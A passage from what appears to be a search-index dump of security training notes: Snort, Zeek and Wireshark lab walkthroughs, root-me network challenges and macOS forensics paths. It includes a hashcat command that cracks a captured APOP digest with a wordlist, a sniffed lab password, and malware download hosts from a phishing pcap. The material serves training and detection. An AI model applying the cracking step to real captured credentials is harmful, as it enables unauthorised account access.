0x114C66F0 Ack: 0x38AFFFF3 Win: 0x1920 TcpLen: 20 =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ ... FTP  local.rules : # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any 21 (msg: \"FTP Packet Detected\"; sid: 100001; rev:1;) alert tcp any 21 <> any any (msg: \"FTP Packet Detected\"; sid: 100002; rev:2;) ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -c local.rules -dev -l . -r ftp-png-gif.pcap ... To discover the FTP service name (get enough packets for the handshake to complete): ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -r snort.log.1669576870 -d \"tcp and port 21\" -n 10 To detect failed FTP login attempts in the given pcap : # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any any (msg: \"Failed FTP Login Attempt Detected\"; content:\"530 User\" ; sid: 100001; rev:1;) To detect successful FTP logins: # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any any (msg: \"Successful FTP Login Attempt Detected\"; content:\"230 User\" ; sid: 100001; rev:1;) Each FTP login attempt with a valid username and bad password prompts a default message with the pattern; “331 Password”. Try to filter the given pattern in the FTP traffic. Try to filter the given username. To detect failed FTP login attempts with a valid username but a bad password or no password: # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any any (msg: \"Successful FTP Login Attempt Detected\"; content:\"331 Password\" ; sid: 100001; rev:1;) To detect failed FTP login attempts with “Administrator” username but a bad password or no password: # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any any (msg: \"Successful FTP Login Attempt Detected\"; content:\"331 Password\"; content:\"Administrator\"; sid: 100001; rev:1;) Images  PNG  Use the Hex Signature 89 50 4E 47 0D 0A 1A 0A to detect PNG: # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any any (msg: \"PNG File Found\"; content:\"|89 50 4E 47 0D 0A 1A 0A|\"; sid: 100001; rev:1;) 1 packet detected. To identify the software name embedded in the packet: ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-4 (PNG)$ sudo snort -d -r snort.log.1669584904 Running in packet dump mode --== Initializing Snort ==-- Initializing Output Plugins! pcap DAQ configured to read-file. Acquiring network traffic from \"snort.log.1669584904\". --== Initialization Complete ==-- ,,_ -*> Snort! <*- o\" )~ Version 2.9.7.0 GRE (Build 149) '''' By Martin Roesch & The Snort Team: http://www.snort.org/contact#team Copyright (C) 2014 Cisco and/or its affiliates. All rights reserved. Copyright (C) 1998-2013 Sourcefire, Inc., et al. Using libpcap version 1.9.1 (with TPACKET_V3) Using PCRE version: 8.39 2016-06-14 Using ZLIB version: 1.2.11 Commencing packet processing (pid=2328) WARNING: No preprocessors configured for policy 0. 01/05-20:15:59.817928 176.255.203.40:80 -> 192.168.47.171:2732 TCP TTL:128 TOS:0x0 ID:63105 IpLen:20 DgmLen:1174 ***AP*** Seq: 0x3D2348B0 Ack: 0x8C8DF67F Win: 0xFAF0 TcpLen: 20 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 .PNG........IHDR 00 00 01 E0 00 00 01 E0 08 06 00 00 00 7D D4 BE .............}.. 95 00 00 00 19 74 45 58 74 53 6F 66 74 77 61 72 .....tEXtSoftwar 65 00 41 64 6F 62 65 20 49 6D 61 67 65 52 65 61 e.Adobe ImageRea 64 79 71 C9 65 3C 00 00 16 2E 49 44 41 54 78 DA dyq.e<....IDATx. ... GIF  Use the GIF87a and/or GIF89a to detect PNG: # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any any (msg: \"GIF87a File Found\"; content:\"GIF87a\"; sid: 100001; rev:1;) 4 packets found. To identify the...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "b02b2cb8f80862454f1db9cb059bac5f",
    "u": "https://nta.tymyrddin.dev/docs/root-me/pop-apop",
    "t": "POP-APOP ",
    "c": "POP-APOP  root-me challenge POP-APOP : Find the user password in this network frame. wget the zip from root-me Extract the zip Dump the .pcapng in Wireshark Follow -> TCP Stream +OK Hello little hackers. <1755.1.5f403625.BcWGgpKzUPRC8vscWn0wuA==@vps-7e2f5a72> APOP bsmith 4ddd4137b84ff2db7291b568289717f0 +OK Logged in. LIST +OK 2 messages: 1 6 2 76 . RETR 1 +OK 6 octets lutz . quit +OK Logging out. APOP uses a digest parameter, calculated by applying MD5 hashing to a string containing a timestamp with angle brackets followed by a secret key. The result of the digest is a 16 octet value sent in hexadecimal, using lowercase ASCII characters. hash.txt : 4ddd4137b84ff2db7291b568289717f0:<1755.1.5f403625.BcWGgpKzUPRC8vscWn0wuA==@vps-7e2f5a72> hashcat command: hashcat -a 0 -m 10 hash.txt /usr/share/wordlists/rockyou.txt Resources  rfc1939",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "7cdb9ca69c73eec11d04d5d9aa1bdbcc",
    "u": "https://nta.tymyrddin.dev/docs/zeek/phishing",
    "t": "Phishing ",
    "c": "Phishing  An alert triggered: Phishing Attempt . The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. Questions  Investigate the logs. zeek -Cr phishing.pcap hash-demo.zeek Investigate the http.log file. What is the suspicious source address? Which domain address were the malicious files downloaded from? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/phishing$ cat http.log #separator \\x09 #set_separator , #empty_field (empty) #unset_field - #path http #open 2022-11-29-02-56-39 #fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p trans_depth method host uri referrer version user_agent origin request_body_len response_body_len status_code status_msg info_code info_msg tags username passwordproxied orig_fuids orig_filenames orig_mime_types resp_fuids resp_filenames resp_mime_types #types time string addr port addr port count string string string string string string string count count count string count string set[enum] string string set[string] vector[string] vector[string] vector[string] vector[string] vector[string] vector[string] 1561667874.713411 CdfiWK1W5IpFJonQo7 10.6.27.102 49157 23.63.254.163 80 1 GET www.msftncsi.com /ncsi.txt - 1.1 Microsoft NCSI - 0 14 200 OK - - (empty) - - - - - - Fpgan59p6uvNzLFja -text/plain 1561667889.643717 CqVUHAd2v5ksfZO5 10.6.27.102 49159 107.180.50.162 80 1 GET smart-fax.com /Documents/Invoice&MSO-Request.doc - 1.1 Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko - 0 323072 200 OK - - (empty)-- - - - - FB5o2Hcauv7vpQ8y3 - application/msword 1561667898.911759 CpgTPr4QCCxl5g5Rl6 10.6.27.102 49162 107.180.50.162 80 1 GET smart-fax.com /knr.exe - 1.1 Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E) - 0 2437120 200 OK - - (empty) - - - - - - FOghls3WpIjKpvXaEl -application/x-dosexec #close 2022-11-29-02-56-39 Investigate the malicious document in VirusTotal. What kind of file is associated with the malicious document? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/phishing$ cat files.log | zeek-cut md5 cd5a4d3fdd5bffc16bf959ef75cf37bc b5243ec1df7d1d5304189e7db2744128 cc28e40b46237ab6d5282199ef78c464 VBA Investigate the extracted malicious .exe file. What is the given file name in Virustotal? PleaseWaitWindow.exe Investigate the malicious .exe file in VirusTotal. What is the contacted domain name? hopto[.]org Investigate the http.log file. What is the request name of the downloaded malicious .exe file? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/phishing$ cat http.log ... #fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p trans_depth method host uri referrer version user_agent origin request_body_len response_body_len status_code status_msg info_code info_msg tags username passwordproxied orig_fuids orig_filenames orig_mime_types resp_fuids resp_filenames resp_mime_types ... 1561667898.911759 CUaS7e4eL8o256JIVb 10.6.27.102 49162 107.180.50.162 80 1 GET smart-fax.com /knr.exe - 1.1 Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E) - 0 2437120 200 OK - - (empty) - - - - - - FOghls3WpIjKpvXaEl -application/x-dosexec #close 2022-11-29-03-09-38",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "491debbc07701bbfe20c9bdef193b99c",
    "u": "https://nta.tymyrddin.dev/docs/zeek/dns",
    "t": "Anomalous DNS ",
    "c": "Anomalous DNS  An alert triggered: Anomalous DNS Activity . The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. Questions  Investigate the dns-tunneling.pcap file. zeek -Cr dns-tunneling.pcap Investigate the dns.log file. ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/anomalous-dns$ head dns.log #separator \\x09 #set_separator , #empty_field (empty) #unset_field - #path dns #open 2022-11-29-02-25-45 #fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto trans_id rtt query qclass qclass_name qtype qtype_name rcode rcode_name AA TC RD RA Z answers TTLs rejected #types time string addr port addr port enum count intervalstring count string count string count string bool bool bool bool count vector[string] vector[interval] bool 1623212924.825154 CrFIrVDZv1s1wIMvg 10.20.57.3 59580 10.10.2.22 53 udp 5374 0.855652 e7f1018ea0310f25bba0610936fd1cc2af.cisco-update.com 1 C_INTERNET 15 MX 0 NOERRORFF T T 0 3591018ea0f08b48069ca0ffff640c1cfb.cisco-update.com 58.000000 F 1623212925.678141 Cgwae92G7gBAmh0KWh 10.20.57.3 47888 10.10.2.22 53 udp 7434 0.158643 0cfe016cb105e87901f6020958d084ff84.cisco-update.com 1 C_INTERNET 15 MX 0 NOERRORFF T T 0 22e1016cb1f9131fda4f34ffff52a924b3.cisco-update.com 58.000000 F What is the number of DNS records linked to the IPv6 address? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut qtype_name | grep -i AAAA | wc -l 320 Investigate the conn.log file. ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/anomalous-dns$ head conn.log #separator \\x09 #set_separator , #empty_field (empty) #unset_field - #path conn #open 2022-11-29-02-25-45 #fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes conn_state local_orig local_resp missed_bytes history orig_pkts orig_ip_bytes resp_pkts resp_ip_bytes tunnel_parents #types time string addr port addr port enum string intervalcount count string bool bool count string count count count count set[string] 1623212924.825154 CrFIrVDZv1s1wIMvg 10.20.57.3 59580 10.10.2.22 53 udp dns 0.855652 80 175 SF - -0 Dd 1 108 1 203 - 1623212925.678141 Cgwae92G7gBAmh0KWh 10.20.57.3 47888 10.10.2.22 53 udp dns 0.158643 80 175 SF - -0 Dd 1 108 1 203 - What is the longest connection duration? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/anomalous-dns$ cat conn.log | zeek-cut duration | sort -n | uniq ... 9.420791 Investigate the dns.log file. Filter all unique DNS queries. What is the number of unique domain queries? You need to use the DNS query values for summarising and counting the number of unique domains. There are lots of ***.cisco-update.com DNS queries, you need to filter the main address and find out the rest of the queries that don’t contain the ***.cisco-update.com pattern. You can filter the main ***.cisco-update.com DNS pattern as cisco-update.com with cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | head ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort | uniq _tcp.local cisco-update.com in-addr.arpa ip6.arpa rhodes.edu ubuntu.com ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort | uniq | wc -l 6 There are a massive amount of DNS queries sent to the same domain. This is abnormal. Let’s find out which hosts are involved in this activity. What is the IP address of the source host? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut id.orig_h | sort | uniq 10.20.57.3 fe80::202a:f0b1:7d9c:bd9e",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "589c156dd0019686aa22542518df3166",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/hosts",
    "t": "Identifying hosts ",
    "c": "Identifying hosts  When investigating a compromise or malware infection activity, a security analyst should know how to identify the hosts on the network apart from IP to MAC address match. One of the best methods is identifying the hosts and users on the network to decide the investigation’s starting point and list the hosts and users associated with the malicious traffic/activity. Usually, enterprise networks use a predefined pattern to name users and hosts. While this makes knowing and following the inventory easier, it has good and bad sides. The good side is that it will be easy to identify a user or host by looking at the name. The bad side is that it will be easy to clone that pattern and live in the enterprise network for adversaries. There are multiple solutions to avoid these kinds of activities, but for a security analyst, it is still essential to have host and user identification skills. Protocols that can be used in Host and User identification: Dynamic Host Configuration Protocol (DHCP) traffic, for managing automatic IP address and required communication parameters assignment. NetBIOS (NBNS) traffic, for allowing applications on different hosts to communicate with each other. Kerberos traffic, for authenticating service requests between two or more computers over the untrusted network. The ultimate aim is to prove identity securely. Questions  Use the Desktop/exercise-pcaps/dhcp-netbios-kerberos/dhcp-netbios.pcap file. What is the MAC address of the host Galaxy A30 ? 9a:81:41:cb:96:6c How many NetBIOS registration requests does the LIVALJM workstation have? 16 Which host requested the IP address 172.16.13.85 ? Galaxy-A12 Use the Desktop/exercise-pcaps/dhcp-netbios-kerberos/kerberos.pcap file. What is the IP address of the user u5 ? (Enter the address in defanged format.) 10[.]1[.]12[.]2 What is the hostname of the available host in the Kerberos packets? xp1$ .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "f31f9abc88532339d8dcb05cb7f1db1d",
    "u": "https://nta.tymyrddin.dev/docs/zeek/frameworks",
    "t": "Frameworks ",
    "c": "Frameworks  Zeek has 15+ frameworks that help analysts to discover the different events of interest. Questions  Ensure you are in the right directory to find the pcap file and accompanying files: Desktop/Exercise-Files/TASK-8 Investigate the case1.pcap file with intelligence-demo.zeek script. zeek -C -r case1.pcap intelligence-demo.zeek Investigate the intel.log file. Look at the second finding, where was the intel info found? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-8$ cat intel.log #separator \\x09 #set_separator , #empty_field (empty) #unset_field - #path intel #open 2022-11-29-01-10-33 #fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p seen.indicator seen.indicator_type seen.where seen.node matched sources fuid file_mime_type file_desc #types time string addr port addr port string enum enum string set[enum] set[string] string string string 1561667898.779213 CB7PV32LkE7FysWa7k 10.6.27.102 53770 10.6.27.1 53 smart-fax.com Intel::DOMAIN DNS::IN_REQUEST zeek Intel::DOMAIN TASK-8-Demo - - - 1561667898.911759 CVNbG83FLsjLKgtbhi 10.6.27.102 49162 107.180.50.162 80 smart-fax.com Intel::DOMAIN HTTP::IN_HOST_HEADER zeek Intel::DOMAIN TASK-8-Demo - - - #close 2022-11-29-01-10-33 Investigate the http.log file. What is the name of the downloaded .exe file? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-8$ cat http.log | zeek-cut uri /ncsi.txt /Documents/Invoice&MSO-Request.doc /knr.exe Investigate the case1.pcap file with hash-demo.zeek script. Investigate the files.log file. zeek -C -r case1.pcap hash-demo.zeek What is the MD5 hash of the downloaded .exe file? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-8$ cat files.log | zeek-cut md5 cd5a4d3fdd5bffc16bf959ef75cf37bc b5243ec1df7d1d5304189e7db2744128 cc28e40b46237ab6d5282199ef78c464 <= Investigate the case1.pcap file with file-extract-demo.zeek script. zeek -C -r case1.pcap /opt/zeek/share/zeek/policy/frameworks/files/extract-all-files.zeek Investigate the extract_files folder. Review the contents of the text file. What is written in the file? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-8/extract_files$ file * | nl 1 extract-1561667874.743959-HTTP-Fpgan59p6uvNzLFja: ASCII text, with no line terminators 2 extract-1561667889.703239-HTTP-FB5o2Hcauv7vpQ8y3: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.3, Code page: 1252, Template: Normal.dotm, Last Saved By: Administrator, Revision Number: 2, Name of Creating Application: Microsoft Office Word, Create Time/Date: Thu Jun 27 18:24:00 2019, Last Saved Time/Date: Thu Jun 27 18:24:00 2019, Number of Pages: 1, Number of Words: 0, Number of Characters: 1, Security: 0 3 extract-1561667899.060086-HTTP-FOghls3WpIjKpvXaEl: PE32 executable (GUI) Intel 80386, for MS Windows ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-8/extract_files$ cat extract-1561667874.743959-HTTP-Fpgan59p6uvNzLFja Microsoft NCSI Resources  Zeek: Frameworks",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "33a4b9801919f58274b2d0aaea19446d",
    "u": "https://nta.tymyrddin.dev/docs/zeek/scripts",
    "t": "Scripts ",
    "c": "Scripts  Zeek has its own event-driven scripting language, which is as powerful as high-level languages and allows us to investigate and correlate the detected events. Scripts can also be used to apply a policy. What Where Zeek has base scripts installed by default, and these are not intended to be modified. These scripts are located in /opt/zeek/share/zeek/base . User-generated or modified scripts should be located in a specific path. These scripts are located in /opt/zeek/share/zeek/site . Policy scripts are located in a specific path. These scripts are located in /opt/zeek/share/zeek/policy . To automatically load/use a script in live sniffing mode, identify the script in the Zeek configuration file. You can also use a script for a single run. The configuration file is located in /opt/zeek/share/zeek/site/local.zeek . Zeek scripts use the .zeek extension. Do not modify anything under the zeek/base directory. User-generated and modified scripts should be in the zeek/site directory. You can call scripts in live monitoring mode by loading them with the command load @/script/path or load @script-name in local.zeek file. Zeek is event-oriented, not packet-oriented! Use/write scripts to handle the event of interest. GUI vs scripts  Sample script: event dhcp_message (c: connection, is_orig: bool, msg: DHCP::Msg, options: DHCP::Options) { print options$host_name; } Use: ubuntu@ubuntu$ zeek -C -r smallFlows.pcap dhcp-hostname.zeek student01-PC vinlap01 Customized script locations  /opt/zeek/share/zeek/base/bif /opt/zeek/share/zeek/base/bif/plugins /opt/zeek/share/zeek/base/protocols Questions  Ensure you are in the right directory to find the pcap file and accompanying files: Desktop/Exercise-Files/TASK-6 Investigate the smallFlows.pcap file. Investigate the dhcp.log file. zeek -C -r smallFlows.pcap dhcp-hostname.zeek What is the domain value of the vinlap01 host? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-6/smallflow$ cat dhcp.log #separator \\x09 #set_separator , #empty_field (empty) #unset_field - #path dhcp #open 2022-11-29-00-36-54 #fields ts uids client_addr server_addr mac host_name client_fqdn domain requested_addr assigned_addr lease_time client_message server_message msg_types duration #types time set[string] addr addr string string string string addr addr interval string string vector[string] interval 1295981573.013593 CCeH6O2TYiCIiNUQV9 192.168.3.131 - 40:61:86:9a:f1:f5 student01-PC - - - - - - -INFORM 0.000000 1295981640.291009 CIwdwt1EsLJNcVGLEe,CJeD8z4JyIrDrPEeB5 172.16.255.1 -00:1e:68:51:4f:a9 vinlap01 - astaro_vineyard - - -- - INFORM,ACK 0.000591 #close 2022-11-29-00-36-56 Investigate the bigFlows.pcap file. zeek -C -r bigFlows.pcap dhcp-hostname.zeek Investigate the dhcp.log file. What is the number of identified unique hostnames? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-6/bigflow$ cat dhcp.log | zeek-cut host_name | sort -rn | uniq | wc -l 18 <= -1 Investigate the dhcp.log file. What is the identified domain value? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-6/bigflow$ cat dhcp.log | zeek-cut domain jaalam.net Investigate the dns.log file. What is the number of unique queries? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-6/bigflow$ cat dns.log | zeek-cut query | grep -v -e '*' -e '-' | sort -rn | uniq | wc -l 1109 Resources  Zeek’s official training platform",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "98010da5dcc51d5113df6b4d4b6c3f44",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/on-path",
    "t": "ARP poisoning & on-path ",
    "c": "ARP poisoning & on-path  ARP protocol, or Address Resolution Protocol (ARP), is the technology responsible for allowing devices to identify themselves on a network. Address Resolution Protocol Poisoning (also known as ARP Spoofing or Man In The Middle (MITM) attack) is a type of attack that involves network jamming/manipulating by sending malicious ARP packets to the default gateway. The ultimate aim is to manipulate the “IP to MAC address table” and sniff the traffic of the target host. There are a variety of tools available to conduct ARP attacks. However, the mindset of the attack is static, so it is easy to detect such an attack by knowing the ARP protocol workflow and Wireshark skills. ARP analysis in a nutshell: Works on the local network Enables the communication between MAC addresses Not a secure protocol Not a routable protocol It doesn’t have an authentication function Common patterns are request & response, announcement and gratuitous packets. Questions  Use the Desktop/exercise-pcaps/arp/Exercise.pcapng file. What is the number of ARP requests crafted by the attacker? 284 What is the number of HTTP packets received by the attacker? 90 What is the number of sniffed username&password entries? 6 What is the password of the Client986 ? clientnothere! What is the comment provided by the Client354 ? Nice work! .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d958becabccad7c5519754c3750dc02d",
    "u": "https://nta.tymyrddin.dev/docs/root-me/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Root-me Network challenges Why?  Investigate captured traffic, network services, and perform packet analysis. How?  FTP authentication TELNET authentication ETHERNET frame Twitter authentication Bluetooth Unknown file CISCO password DNS zone transfer IP Time To Live LDAP null bind POP-APOP SIP authentication ETHERNET patched transmission Global system traffic for mobile communication SSL HTTP exchange",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "957d50c3d9b051a17a73560c9e599c80",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/rules",
    "t": "Firewall rules ",
    "c": "Firewall rules  Wireshark is mostly, but not only about packet details; it facilitates the creation of firewall rules with the “Tools -> Firewall ACL Rules” menu. This will open a new window and provide a combination of rules (IP, port and MAC address-based) for different purposes. These rules are generated for implementation on an outside firewall interface. Currently, Wireshark can create rules for: Netfilter (iptables) Cisco IOS (standard/extended) IP Filter (ipfilter) IPFirewall (ipfw) Packet filter (pf) Windows Firewall (netsh new/old format) Questions  Use the Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap file. Select packet number 99 . Create a rule for IPFirewall ( ipfw ). What is the rule for denying source IPv4 address ? add deny ip from 10.121.70.151 to any in Select packet number 231 . Create IPFirewall rules. What is the rule for allowing destination MAC address ? add allow MAC 00:d0:59:aa:af:80 any in",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "0729d451b0245ace90dd7b538d2fc73a",
    "u": "https://nta.tymyrddin.dev/docs/root-me/global-mobile",
    "t": "Global system traffic for mobile communication ",
    "c": "Global system traffic for mobile communication  root-me challenge Global System Traffic for Mobile communication : You have been asked to check the network traffic file enclosed. Report your findings to your caller, even if it seems the trace was truncated. Get data without length information of package with size 126 bytes on wire from the capture: 0791233010210068040b917120336603f800002140206165028047c7f79b0c52bfc52c101d5d0699d9e133283d0785e764f87b6da7956bb7f82d2c8b Use an online SMS PDU Decoder. Resources  rfc5724",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "51978cecfd13891857d44ac622fd9433",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/clear-text",
    "t": "Clear-text protocol analysis ",
    "c": "Clear-text protocol analysis  Investigating clear-text protocol traces sounds easy, but when the time comes to investigate a big network trace for incident analysis and response, the game changes. Proper analysis is more than following the stream and reading the cleartext data. For a security analyst, it is important to create statistics and key results from the investigation process. FTP analysis  File Transfer Protocol (FTP) is designed to transfer files with ease, so it focuses on simplicity rather than security. As a result of this, using this protocol in unsecured environments could create security issues like: On-path attacks Credential stealing and unauthorised access Phishing Malware planting Data exfiltration HTTP Analysis  Hypertext Transfer Protocol (HTTP) is a clear-text-based, request-response and client-server protocol. It is the standard type of network activity to request/serve web pages, and by default, it is not blocked by any network perimeter. As a result of being unencrypted and the backbone of web traffic, HTTP is one of the must-to-know protocols in traffic analysis. Following attacks could be detected with the help of HTTP analysis: Phishing pages Web attacks Data exfiltration Command and control traffic (C2) User-Agent analysis  As the adversaries use sophisticated technics to accomplish attacks, they try to leave traces similar to natural traffic through the known and trusted protocols. For a security analyst, it is important to spot the anomaly signs on the bits and pieces of the packets. The user-agent field is one of the great resources for spotting anomalies in HTTP traffic. In some cases, adversaries successfully modify the user-agent data, which could look supernatural. A security analyst cannot rely only on the user-agent field to spot an anomaly. Never whitelist a user-agent , even if it looks natural. User-agent-based anomaly/threat detection/hunting is an additional data source to check and is useful when there is an obvious anomaly. Questions  Use the Desktop/exercise-pcaps/ftp/ftp.pcap file. How many incorrect login attempts are there? 737 What is the size of the file accessed by the ftp account? 39424 The adversary uploaded a document to the FTP server. What is the filename? resume.doc The adversary tried to assign special flags to change the executing permissions of the uploaded file. What is the command used by the adversary? chmod 777 Use the Desktop/exercise-pcaps/http/user-agent.cap file. Investigate the user agents. What is the number of anomalous user-agent types? 6 What is the packet number with a subtle spelling difference in the user agent field? 52 Use the Desktop/exercise-pcaps/http/http.pcapng file. Locate the Log4j attack starting phase. What is the packet number? 444 Locate the Log4j attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude {} .) Copy value. 62[.]210[.]130[.]250 .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "64d144f35a8ce64a7bce56a161cbf558",
    "u": "https://dfir.tymyrddin.dev/docs/notes/macos",
    "t": "macOS analysis ",
    "c": "macOS analysis  Configuration files  Configuration files on macOS have the extension .plist (property list) and store configuration settings and properties. Read with: plutil -p /var/db/locationd/configfile.plist They are usually formatted in XML, although they can use JSON or be binaries, in which case you can convert them to XML: plutil -convert xml1 path/to/JSONformatted.plist plutil -convert xml1 path/to/binary.plist Downloads  The QuarantineEventsV2 database provides information on when a file was downloaded from the internet. To list the application that did the downloading, the download link, and then the date it was downloaded (by adding 978307200 it converts to an epoch value): sqlite3 /Users/ [ username ] /Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 \\ 'select LSQuarantineAgentName, LSQuarantineDataURLString, date(LSQuarantineTimeStamp + 978307200, \"unixepoch\") as downloadedDate from LSQuarantineEvent order by LSQuarantineTimeStamp' \\ | sort -u | grep '|' --color Install history  Find installed applications and the time they were installed from /Library/Receipts/InstallHistory.plist : plutil -p /Library/Receipts/InstallHistory.plist Location tracking  Listing programs and services allowed to leverage (your) location information: sudo plutil -p /var/db/locationd/clients.plist | ack --passthru 'BundlePath' sudo plutil -p /var/db/locationd/clients.plist | grep 'BundlePath' Most recently used  /Users/[username]/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ApplicationRecentDocuments /Users/[username]/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.FavoriteItems.sfl2 /Users/[username]/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.FavoriteVolumes.sfl2 /Users/[username]/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ProjectsItems.sfl2 /Users/[username]/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentApplications.sfl2 /Users/[username]/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.iCloudItems.sfl2 /Users/[username]/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentServers.sfl2 /Users/[username]/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentHosts.sfl2 /Users/[username]/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentDocuments.sfl2 List subdirectory relevant to recent applications: strings '/Users/[username]/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ApplicationRecentDocuments/' | sort -u Audit logs  Read the audit logs: praudit /private/var/audit/current | head -n 100 Use auditreduce to look for specific activity: auditreduce -d 20230530 -u [ username ] /var/audit/* | praudit | head -n 20 Show user logins and logouts: auditreduce -c lo /var/audit/* | praudit | head -n 10 Evidence of execution  Places to retrieve command line activity (shell is likely bash or zsh : /Users/ [ username ] /.zsh_sessions/* /Users/ [ username ] /.zsh_history /private/var/root/.bash_history Check changes to the admin group: plutil -p /private/var/db/dslocal/nodes/Default/groups/admin.plist There are at least two TCC (ransparency, Consent, and Control) databases on the system - one per user, and one root: /Library/Application Support/com.apple.TCC/TCC.db /Users/[username]/Library/Application Support/com.apple.TCC/TCC.db One of the most important pieces of information is which applicaitons have FDA (Full Disk Access), via the kTCCServiceSystemPolicyAllFiles service. This is only located in the root TCC database. sqlite3 /Library/Application \\ Support/com.apple.TCC/TCC.db Persistence  start up / login items  /var/db/com.apple.xpc.launchd/disabled.*.plist /System/Library/StartupItems /Users/[username]/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm /var/db/launchd.db/com.apple.launchd/* scripts  /Users/[username]/Library/Preferences/com.apple.loginwindow.plist /etc/periodic/[daily, weekly, monthly] cronjobs  /private/var/at/tabs/ /usr/lib/cron/jobs/ system extensions  /Library/SystemExtensions/ Daemons  /System/Library/LaunchDaemons/*.plist /System/Library/LaunchAgents/*.plist /Library/LaunchDaemons/*.plist /Library/LaunchAgents/*.plist /Users/[username]/Library/LaunchAgents/*.plist Full list of possible persistence locations . Query built-in security mechanisms  Airdrop: sudo ifconfig awdl0 | awk '/status/{print $2}' Filevault: sudo fdesetup status Firewall (Enabled = 1, Disabled = 0): defaults read 